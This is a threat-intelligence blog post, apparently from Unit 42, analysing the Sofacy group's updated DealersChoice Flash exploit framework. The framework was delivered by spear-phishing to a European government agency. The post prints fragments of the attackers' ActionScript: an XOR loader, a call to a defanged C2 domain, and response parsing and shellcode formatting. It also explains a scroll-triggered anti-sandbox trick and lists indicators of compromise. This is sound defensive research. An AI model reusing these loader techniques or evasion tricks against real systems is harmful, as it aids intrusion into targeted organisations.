{
    "title": "sofacy uses dealerschoice to target european government agency",
    "text": "Tools Playbooks Speaking Events About Us\nSofacy Uses DealersChoice to Target European\nGovernment Agency\n25,476 people reacted 0 7 min. read\nThis post is also available in: 日本語  (Japanese )\nSummary\nBack in October 2016 , Unit 42 published an initial analysis on a Flash exploitation framework used by the Sofacy\nthreat group called DealersChoice . The attack consisted of Microsoft Word delivery documents that contained\nAdobe Flash objects capable of loading additional malicious Flash objects embedded in the file or directly\nprovided by a command and control server. Sofacy continued to use DealersChoice throughout the fall of 2016,\nwhich we also documented in our December 2016  publication discussing Sofacy’s larger campaign.\nOn March 12 and March 14, we observed the Sofacy group carrying out an attack on a European government\nagency involving an updated variant of DealersChoice. The updated DealersChoice documents used a similar\nprocess to obtain a malicious Flash object from a C2 server, but the inner mechanics of the Flash object\ncontained significant differences in comparison to the original samples we analyzed.\nOne of the differences was a particularly clever evasion technique: to our knowledge this has never been\nobserved in use. With the previous iterations of DealersChoice samples, the Flash object would immediately load\nand begin malicious tasks. In the March attacks, the Flash object is only loaded if the user scrolls through the\nentire content of the delivery document and views the specific page the Flash object is embedded on. Also,\nDealersChoice requires multiple interactions with an active C2 server to successfully exploit an end system.\nThe overall process to result in a successful exploitation is:\n1. User must open the Microsoft Word email attachment\n2. User must scroll to page three of the document, which will run the DealersChoice Flash object\n3. The Flash object must contact an active C2 server to download an additional Flash object containing exploit\ncode\n4. The initial Flash object must contact the same C2 server to download a secondary payload\n5. Victim host must have a vulnerable version of Flash installed\n \nThe Attack\nThe attack involving this updated variant of DealersChoice was targeting a European government organization.\nThe attack relied on a spear‐phishing email with a subject of “Defence & Security 2018 Conference Agenda” that\nhad an attachment with a filename of “Defence & Security 2018 Conference Agenda.docx”. The attached\ndocument contains a conference agenda that the Sofacy group appears to have copied directly from the website\nfor the “Underwater Defence & Security 2018 Conference” here .\nOpening the attached “Defence & Security 2018 Conference Agenda.docx” file does not immediately run\nmalicious code to exploit the system. Instead, the user must scroll to the third page of the document, which will\nload a Flash object that contains ActionScript that will attempt to exploit the user’s system to install a malicious\npayload. The Flash object embedded within this delivery document is a variant of an exploit tool that we call\nDealersChoice. This suggests that the Sofacy group is confident that the targeted individuals would be interested\nenough in the content to peruse through it.\nWe analyzed the document to determine the reason that the malicious Flash object only ran when the user\nscrolled to the third page. According to the document.xml file, the DealersChoice loader SWF exists after the\n“covert‐shores‐small.png” image file within the delivery document. This image file exists on the third page of the\ndocument, so the user would have to scroll down in the document to this third page to get the SWF file to run.\nThe user may not notice the Flash object on the page, as Word displays it as a tiny black box in the document, as\nseen in Figure 1. This is an interesting anti‐sandbox technique, as it requires human interaction prior to the\ndocument exhibiting any malicious activity.\n \nFigure 1 Flash object appearing as a small black box in delivery document\n \nUpdated DealersChoice\nThis DealersChoice Flash object shares a similar process to previous variants; however, it appears that the Sofacy\nactors have made slight changes to its internal code. Also, it appears that the actors used ActionScript from an\nopen source video player called “f4player”, which is freely available on GitHub  with the following description:\nf4Player is an open source flash (AS3) video player and library project. It is so\nsmall that it is only 10kb (with skin file) and totally free under GPL license.\n \nThe Sofacy developer modified the f4player’s ActionScript to include additional code to load an embedded Flash\nobject. The additions include code to decrypt an embedded Flash object and an event handler that calls a newly\nadded function (“skinEvent2”) that plays the decrypted object, as seen in the code snippet below:By Robert Falcone\nMarch 15, 2018 at 1:00 PM\nCategory: Unit 42\nTags: DealersChoice , European Government Agency , Sofacy\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12var skinEvent2 :Function  = function (param1:Event):void\n {\n    skin2 = param1.currentTarget .content;\n    stage.addChild (skin2);\n    skin2.play(\"hxxp://ndpmedia24[.]com/0pq6m4f.m3u8\" );\n };\n var mov:Loader = new Loader();\n mov.contentLoaderInfo .addEventListener (Event.COMPLETE ,skinEvent2 );\n var b:ByteArray  = new this.Mov();\n var k:uint = 82;\n var i:uint = 4;\n while(i < b.length)\nSearch Unit 42\nSHARE \n  \nThe above code allows DealersChoice to load a second SWF object, specifically loading it with an argument that\nincludes a C2 URL of “hxxp://ndpmedia24[.]com/0pq6m4f.m3u8”.\nThe embedded SWF extracts the domain from the C2 URL passed to it and uses it to craft a URL to get the\nserver’s ‘crossdomain.xml’ file in order to obtain permissions to load additional Flash objects from the C2 domain.\nThe ActionScript relies on event listeners to call specific functions when the event “Event.COMPLETE” is\ntriggered after successful HTTP requests are issued to the C2 server. The event handlers call functions with the\nfollowing names, which includes an incrementing number that represents the order in which the functions are\ncalled:\nonload1\nonload2\nonload3\nonload5\nWith these event handlers created, the ActionScript starts by gathering system data from the\nflash.system.Capabilities.serverString property (just like in the original DealersChoice.B samples) and issues an\nHTTP GET with the system data as a parameter to the C2 URL that was passed as an argument to the embedded\nSWF when it was initially loaded. When this HTTP request completes, the event listener will call the ‘onload1’\nfunction.\nThe ‘onload1’ function parses the response data from the request to the C2 URL using regular expressions.\nAccording to the following code snippet, it appears the regular expression is looking for a hexadecimal string\nafter “/” and before “/sec”, as well as any string between “/hls/” and “/tracks”:\n \nThe regular expressions suggest that the C2 server responds with content that is meant to resemble HTTP Live\nSteaming (HLS) traffic, which is a protocol that uses HTTP to deliver audio and video files for streaming. The use\nof HLS coincides with the use of ActionScript code from the f4player to make the traffic seem legitimate. The\nvariables storing the results of the regular expression matches are used within the ActionScript for further\ninteraction with the C2 server. The following is a list of these variables and their purpose:\n \nVariable Purpose\nr1 Used as the decryption key for the downloaded SWF file. This will be a 16‐byte hexadecimal string.\nr2 Not used.\nr3Used as the URL within the HTTP request within onload1 function, specifically as the URL to get the\nmalicious SWF file to exploit the system.\nr4Used as the URL within the HTTP request within onload2 function, specifically as the URL to get the payload\nto run after successful exploitation of the system.\n \nThe ‘onload1’ function then sends an HTTP GET request to the C2 domain using the value stored in the ‘r3’\nvariable as a URL. When this HTTP request completes, the event listener will call the ‘onload2’ function.\nThe ‘onload2’ function decrypts the response received from the HTTP request issued in ‘onload1’ function. It\ndoes so by calling a sub‐function to decrypt the content, using the value stored in the ‘r1’ variable as a key. The\nsub‐function to decrypt the content skips the first 4 bytes, suggesting that the first four bytes of the downloaded\ncontent is in cleartext (most likely the “FWS” or “CWS” header to look legitimate).\nAfter decrypting the content, the ‘onload2’ function will issue another HTTP GET request with the system data as\na parameter, but this time to the C2 using a URL from the ‘r4’ variable. When this request completes, the event\nlistener will call the ‘onload3’ function.\nThe ‘onload3’ function will take the response to the HTTP request in ‘onload2’ and treat it as the payload. The\nActionScript will read each byte of the C2 response and get the hexadecimal value of each byte and create a text\narray of 4‐byte hexadecimal values with “0x” prepended and “,” appended to each using the following code:\n \nThis hexadecimal string will most likely be a string of shellcode that will contain and decrypt the ultimate portable\nexecutable (PE) payload. The string of comma separated hexadecimal values is passed as a parameter when\nloading the SWF file downloaded in ‘onload2’. This function creates an event listener for when the SWF file is\nsuccessfully loaded, which will call the ‘onload5’ function.\nThe ‘onload5’ function is responsible for adding the newly loaded SWF object as a child object to the current\nrunning object using the following code:\nThis loads the SWF file, effectively running the malicious code on the system. During our analysis, we were\nunable to coerce the C2 into providing a malicious SWF or payload. As mentioned in our previous blogs on\nDealersChoice, the payload of choice for previous variants was SofacyCarberp (Seduploader), but we have no\nevidence to suggest this tool was used in this attack. We are actively researching and will update this blog in the\nevent we discover the malicious Flash object and payload delivered in this attack.\n \nLinkage to Prior Campaign\nThe delivery document used in this attack was last modified by a user named ‘Nick Daemoji’, which provides a\nlinkage to previous Sofacy related delivery documents. The previous documents that used this user name were\nmacro‐laden delivery documents that installed SofacyCarberp/Seduploader payloads, as discussed in Talos’ blog .\nThis overlap also points to a similar social engineering theme between these two campaigns, as both used\ncontent from upcoming military and defense conferences as a lure.\n \nConclusion\nThe Sofacy threat group continues to use their DealersChoice framework to exploit Flash vulnerabilities in their\nattack campaigns. In the most recent variant, Sofacy modified the internals of the malicious scripts, but continues\nto follow the same process used by previous variants by obtaining a malicious Flash object and payload directly\nfrom the C2 server. Unlike previous samples, this DealersChoice used a DOCX delivery document that required\nthe user to scroll through the document to trigger the malicious Flash object. The required user interaction\nturned out to be an interesting anti‐sandbox technique that we had not seen this group perform in the past.\n \nIndicators of Compromise\nDealersChoice \n0cd9ac328d858d8d83c9eb73bfdc59a958873b3d71b24c888d7408d9512a41d7 (Defence &\nSecurity 2018 Conference Agenda.docx)\nndpmedia24[.]com\n \nMacro‐ladened documents\ne5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179ae\nefb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52\nc4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52f\n 13\n14\n15\n16\n17 {\n    b[i] = b[i] ^ k;\n    i++;\n }\n mov.loadBytes (b);\n1\n2\n3\n4\n5\n6\n7var data:String = e.target.data;\nvar p1:RegExp = /\\/([0-9a-f]+)\\/sec/gim;\nr1 = p1.exec(data);\nvar r2:Array = p1.exec(data);\nvar p2:RegExp = /\\/hls\\/(.+)\\/tracks/gim;\nvar r3:Array = p2.exec(data);\nr4 = p2.exec(data);\n1sh = she + (\"0x\" + hex.substr(i + 6,2) + hex.substr(i + 4,2) + hex.substr(i + 2,2) + hex.substr(i,2) + \",\");\n1stage.addChild (param1.currentTarget .content);\n Get updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nEmail address Subscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.Popular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemapLegal No ces\nPrivacy\nTerms of Use\nDocumentsAccount\nManage Subscriptions\nReport a Vulnerability\nWe use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners. Privacy Policy\n "
}